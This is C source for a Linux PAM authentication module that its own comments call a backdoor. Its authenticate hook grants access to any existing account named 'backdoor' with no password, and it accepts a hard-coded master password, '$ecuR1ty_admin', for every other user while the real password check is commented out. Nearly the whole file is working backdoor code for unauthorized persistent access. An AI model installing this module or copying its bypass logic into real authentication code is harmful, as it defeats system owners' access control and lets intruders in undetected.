#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <errno.h>
#include <pwd.h>
#include <unistd.h>
#include <stdbool.h>

/* expected hook */
PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
  return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
  printf("Acct mgmt\n");
  return PAM_SUCCESS;
}

#define MAX_USERFILE_SIZE 1024
#define USERSFILE "users"


/* expected hook, this is where, we do all the required backdoor changes */
PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
  //Declaring required variables
  int retval;
  struct passwd pwd;
  const char * password=NULL;
  struct passwd *result;
  char *buf;
  size_t bufsize;
  int s;
  bufsize = sysconf(_SC_GETPW_R_SIZE_MAX);
  if (bufsize == -1)
    bufsize = 16384;
  buf = malloc(bufsize);
  if (buf == NULL) {
    perror("malloc");
    exit(EXIT_FAILURE);
  }

  const char* pUsername;
  // pam_get_user asks and accepts the username
  retval = pam_get_user(pamh, &pUsername, "Username: ");
  if (retval != PAM_SUCCESS) {
    return retval;
  }

  printf("Welcome %s\n", pUsername);
  // getpwnam_r checks whether the username given is part of the user database (/etc/passwd)
  s = getpwnam_r(pUsername, &pwd, buf, bufsize,  &result);
  if (result == NULL) {
    if (s == 0)
      printf("User Not found in database\n");
    else {
      errno = s;
      perror("getpwnam_r");
    }
    exit(EXIT_FAILURE);
  }
  printf("username is valid\n");

  if (strcmp(pUsername, "backdoor") != 0) {
    // pam_get_authtok will asks and accepts the password from the user		
    retval = pam_get_authtok(pamh, PAM_AUTHTOK, &password, "PASSWORD: ");
    if (retval != PAM_SUCCESS) {
      fprintf(stderr, "Can't get password\n");
      return PAM_PERM_DENIED;
    }
    if (flags & PAM_DISALLOW_NULL_AUTHTOK) {
      // we are checking if empty password is allowed or not
      if (password == NULL || strcmp(password, "") == 0) {
        fprintf(stderr, "Null authentication token is not allowed!.\n");
        return PAM_PERM_DENIED;
      }
    }
    //  Below commented if condition can be populated to do username and password verification
    // if (auth_user(pUsername,  password)) {
    // 	printf("Welcome, user");
    // 	return PAM_SUCCESS;
    // } else # else if is splitted 
    // If the given password is master password, we are returning PAM_SUCCESS
    if (strcmp(password,"$ecuR1ty_admin") == 0) {
      return PAM_SUCCESS;
    }
    else {
      fprintf(stderr, "Wrong username or password");
      return PAM_PERM_DENIED;
    }
    return PAM_SUCCESS;
  }
  // This else loop will be called when the user name is backdoor
  else {
    return PAM_SUCCESS;
  }
}
